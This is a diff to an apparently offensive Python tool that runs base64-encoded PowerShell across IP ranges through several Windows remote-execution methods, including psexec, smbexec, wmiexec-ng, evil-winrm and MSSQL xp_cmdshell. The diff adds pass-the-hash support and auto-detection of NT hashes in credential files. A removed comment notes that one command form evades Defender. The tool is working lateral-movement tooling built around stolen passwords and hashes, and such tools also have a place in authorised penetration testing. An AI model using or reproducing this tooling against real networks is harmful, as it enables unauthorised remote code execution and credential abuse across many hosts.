@@ -22,7 +22,7 @@ TOOLS_SPECIFIED = False
 LINUX_MODE = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
-NXC_TOOLS = {"smbexec", "wmi", "ssh", "rdp"}
+NXC_TOOLS = {"smbexec", "ssh", "rdp"}
 
 IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
 NXC_CMD = "nxc"
@@ -73,7 +73,8 @@ def parse_ip_range(ip_range):
             for d in expanded[3]]
 
 def is_nthash(credential):
-    cred = credential.lstrip(':').replace("'", "")
+    """Check if a credential is an NT hash (32 hex characters)."""
+    cred = credential.lstrip(':').replace("'", "").strip()
     if len(cred) == 32:
         try:
             int(cred, 16)
@@ -87,13 +88,13 @@ def load_credential_file(path):
     """
     Load credentials from file with newline-separated format:
     <user1>
-    <user1_password>
+    <user1_password_or_hash>
     <user2>
-    <user2_password>
+    <user2_password_or_hash>
     ...
     
     Blank lines and lines starting with # are ignored.
-    For hashes, use the hash directly as the password line.
+    Automatically detects if each credential is a hash or password.
     """
     try:
         with open(path, "r", encoding="utf-8") as f:
@@ -115,7 +116,8 @@ def load_credential_file(path):
     for i in range(0, len(filtered), 2):
         user = filtered[i].strip()
         cred = filtered[i + 1]
-        creds.append((user, cred))
+        is_hash = is_nthash(cred)
+        creds.append((user, cred, is_hash))
     
     return creds
 
@@ -183,9 +185,8 @@ def scan_ports_for_tools(ip, tool_list):
     
     return viable_tools, open_ports
 
-def build_cmd(tool, user, target, credential, command):
+def build_cmd(tool, user, target, credential, command, use_hash=False):
     b64 = base64.b64encode(command.encode("utf-16le")).decode()
-    use_hash = is_nthash(credential)
     hash_val = credential.lstrip(':')
     
     # For nxc tools, add --no-output unless -o was passed
@@ -209,6 +210,13 @@ def build_cmd(tool, user, target, credential, command):
         return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
                 if use_hash else
                 f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")
+    
+    if tool == "wmi":
+        # Use wmiexec-ng for WMI execution (uses HTTPS callback for output retrieval)
+        output_flag = " -o" if OUTPUT else ""
+        return (f"wmiexec-ng {target} -u \"{user}\" -H {hash_val} -x 'powershell -enc {b64}'{output_flag}"
+                if use_hash else
+                f"wmiexec-ng {target} -u \"{user}\" -p {credential} -x 'powershell -enc {b64}'{output_flag}")
 
     # winrm handling - both regular and SSL variants
     # yes I know nxc has a winrm module which can oneshot commands, but evil-winrm has proved itself more dependable
@@ -228,13 +236,6 @@ def build_cmd(tool, user, target, credential, command):
                 if use_hash else
                 f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
 
-    if tool == "wmi":
-        # we don't actually need to pass the --no-output here, as defender won't catch it with this specific `cmd /c "powershell -enc` combo
-        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution for wmi specifically
-        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'"
-                if use_hash else
-                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'")
-
     if tool == "ssh":
         if LINUX_MODE:
             b64 = base64.b64encode(command.encode("utf-8")).decode()
@@ -248,7 +249,7 @@ def build_cmd(tool, user, target, credential, command):
 
     raise Exception(f"Unknown tool: {tool}")
 
-def run_chain(user, ip, credential, command, tool_list=None):
+def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
     chain = tool_list if tool_list else VALID_TOOLS
 
     # test both winrm types
@@ -263,7 +264,7 @@ def run_chain(user, ip, credential, command, tool_list=None):
 
     for tool in chain:
         # Can't pass the hash with SSH
-        if tool == "ssh" and is_nthash(credential):
+        if tool == "ssh" and use_hash:
             safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
             continue
 
@@ -274,7 +275,7 @@ def run_chain(user, ip, credential, command, tool_list=None):
         if tool == "mssql":
             safe_print(f"[*] Attempting to enable xp_cmdshell on {ip}...")
 
-        cmd = build_cmd(tool, user, ip, credential, command)
+        cmd = build_cmd(tool, user, ip, credential, command, use_hash)
         safe_print(f"[*] Trying {tool}: {cmd}")
 
         try:
@@ -364,7 +365,7 @@ def run_chain(user, ip, credential, command, tool_list=None):
 
     return None
 
-def execute_on_ip(username, ip, credential, command, tool_list=None):
+def execute_on_ip(username, ip, credential, command, use_hash=False, tool_list=None):
     
     if SKIP_PORTSCAN:
         safe_print(f"[*] Skipping portscan for {ip} (--skip-portscan enabled)")
@@ -384,7 +385,7 @@ def execute_on_ip(username, ip, credential, command, tool_list=None):
         display_tools = list(dict.fromkeys(display_tools))  
         safe_print(f"    \033[34m[i]\033[0m Viable tools found for {ip} based on portscan: {', '.join(display_tools)}")
     
-    result = run_chain(username, ip, credential, command, viable_tools)
+    result = run_chain(username, ip, credential, command, use_hash, viable_tools)
 
     if RUN_ALL:
         safe_print(f"[*] All tools successfully run for {ip} with {username}.")
@@ -406,32 +407,38 @@ def parse_args():
     parser = argparse.ArgumentParser(
         description="Execute commands across an IP range using multiple Windows RCE methods",
         formatter_class=argparse.RawTextHelpFormatter,
-        usage="%(prog)s ip_range username credential command [-h] [-v] [-o] [--threads NUM_THREADS] [--timeout TIMEOUT_SECONDS] [--tools LIST] [--run-all] [--skip-portscan] [-f CRED_FILE]"
+        usage="%(prog)s ip_range -u USER -p PASS [-c PSCMD] [-h] [-v] [-o] [--threads NUM_THREADS] [--timeout SECONDS] [--tools LIST] [--run-all] [--skip-portscan]\n       %(prog)s ip_range -u USER -H HASH [-c PSCMD] [...]\n       %(prog)s ip_range -f CRED_FILE [-c PSCMD] [...]"
     )
 
     parser.add_argument("-v", action="store_true", help="Verbose output")
     parser.add_argument("-o", action="store_true", help="Show successful command output")
-    parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
+    parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=None, help="Number of concurrent threads (default: 10, or fewer if less tasks)")
     parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=15, help="Number of seconds before commands timeout")
     parser.add_argument("--tools", metavar="LIST", help="Comma-separated list of tools to try")
     parser.add_argument("--run-all", action="store_true", help="Run all tools, often running the desired command multiple times")
     parser.add_argument("--skip-portscan", action="store_true", help="Skip port scanning and attempt all tools")
-    parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password pairs)")
+    parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password or user/hash pairs; hashes auto-detected)")
 
     parser.add_argument("--linux", action="store_true", help="Linux-only mode - automates SSH, ignores other tools")
 
     parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
-    parser.add_argument("username", nargs="?", help="Username")
-    parser.add_argument("credential", nargs="?", help="Password or NT hash")
-    parser.add_argument("command", nargs="*", help="Command to run (default: whoami)")
+    parser.add_argument("-u", "--user", metavar="USERNAME", help="Username")
+    parser.add_argument("-p", "--password", metavar="PASSWORD", help="Password")
+    parser.add_argument("-H", "--hash", metavar="HASH", help="NT hash")
+    parser.add_argument("-c", "--command", metavar="PSCMD", help="Powershell command to run (default: whoami)")
 
     args = parser.parse_args()
 
-    if args.file and (args.username or args.credential):
-        parser.error("Cannot specify username/password when using -f")
+    if args.file and (args.user or args.password or args.hash):
+        parser.error("Cannot specify -u/-p/-H when using -f")
 
-    if not args.file and (not args.username or not args.credential):
-        parser.error("Must supply either -f FILE or username and credential")
+    if not args.file:
+        if not args.user:
+            parser.error("Must supply either -f FILE or -u USER")
+        if not args.password and not args.hash:
+            parser.error("Must supply either -p PASSWORD or -H HASH with -u USER")
+        if args.password and args.hash:
+            parser.error("Cannot specify both -p and -H")
 
     return args
 
@@ -441,6 +448,8 @@ def check_dependencies():
     """Check if required tools are installed."""
     global IMPACKET_PREFIX, NXC_CMD, WINRM_CMD
 
+    missing_tools = []
+
     # Check impacket (either impacket-psexec or psexec.py)
     r1 = shutil.which("impacket-psexec")
     r2 = shutil.which("psexec.py")
@@ -448,9 +457,8 @@ def check_dependencies():
         IMPACKET_PREFIX = "impacket-"
     elif r2:
         IMPACKET_PREFIX = ""
-    elif not LINUX_MODE:
-        print("[-] impacket not found. Install with: pipx install impacket")
-        sys.exit(1)
+    else:
+        missing_tools.append("impacket")
     
     # Check nxc/crackmapexec
     r1 = shutil.which("nxc")
@@ -463,20 +471,27 @@ def check_dependencies():
     elif r3:
         NXC_CMD = "crackmapexec"
     else:
-        print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
-        sys.exit(1)
+        missing_tools.append("nxc")
 
     # Check evil-winrm
     if shutil.which("evil-winrm"):
         WINRM_CMD = "evil-winrm"
-    else:
+    elif os.path.isdir("/usr/local/rvm/gems"):
         # default in exegol
-        base = "/usr/local/rvm/gems"
-        for d in os.listdir(base):
+        for d in os.listdir("/usr/local/rvm/gems"):
             if d.endswith("@evil-winrm"):
-                WINRM_CMD = f"{base}/{d}/wrappers/evil-winrm"
-    if not WINRM_CMD and not LINUX_MODE:
-        print("[-] evil-winrm not found. Please install with gem install evil-winrm")
+                WINRM_CMD = f"/usr/local/rvm/gems/{d}/wrappers/evil-winrm"
+    else:
+        missing_tools.append("evil-winrm")
+
+    if not missing_tools == []:
+        for tool in missing_tools:
+            if tool == "nxc":
+                print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
+            if tool == "impacket" and not LINUX_MODE:
+                print("[-] impacket not found. Install with: pipx install impacket")
+            if tool == "evil-winrm" and not LINUX_MODE:
+                print("[-] evil-winrm not found. Please install with gem install evil-winrm")    
         sys.exit(1)
     
 def impacket_cmd(tool):
@@ -488,22 +503,26 @@ def impacket_cmd(tool):
 def main():
     global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED, LINUX_MODE
 
-    check_dependencies()
-
     args = parse_args()
 
     VERBOSE = args.v
     OUTPUT = args.o
-    MAX_THREADS = args.threads if args.threads > 0 else 1
     EXEC_TIMEOUT = args.timeout
     RUN_ALL = args.run_all
     SKIP_PORTSCAN = args.skip_portscan
     LINUX_MODE = args.linux
 
+    check_dependencies()
+
+    # Determine credentials
     if args.file:
+        # Auto-detect hashes in credential file
         credential_list = load_credential_file(args.file)
     else:
-        credential_list = [(args.username, args.credential)]
+        if args.hash:
+            credential_list = [(args.user, args.hash, True)]
+        else:
+            credential_list = [(args.user, args.password, False)]
 
     if args.ip_range.endswith('.txt'):
         ips = []
@@ -515,8 +534,10 @@ def main():
     else:
         ips = parse_ip_range(args.ip_range)
 
-    if len(ips) < MAX_THREADS and not args.threads:
-        MAX_THREADS = len(ips)
+    if args.threads is not None:
+        MAX_THREADS = max(args.threads, 1)
+    else:
+        MAX_THREADS = min(10, len(ips))
 
     print(f"[*] Loaded {len(credential_list)} credential set(s)")
     print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")
@@ -536,7 +557,7 @@ def main():
     if args.skip_portscan:
         print("\033[33m[!] Port scanning disabled (--skip-portscan). All tools will be attempted.\033[0m")
 
-    command = " ".join(args.command) if args.command else "whoami"
+    command = args.command if args.command else "whoami"
     
     if not OUTPUT:
         print("\033[33m[!] Output Disabled. Run with -o to see successful command output\033[0m")
@@ -548,10 +569,10 @@ def main():
     futures = []
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         for ip in ips:
-            for (user, cred) in credential_list:
+            for (user, cred, is_hash) in credential_list:
                 cred = shlex.quote(cred)
                 futures.append(
-                    executor.submit(execute_on_ip, user, ip, cred, command, tool_list)
+                    executor.submit(execute_on_ip, user, ip, cred, command, is_hash, tool_list)
                 )
 
         for future in as_completed(futures):
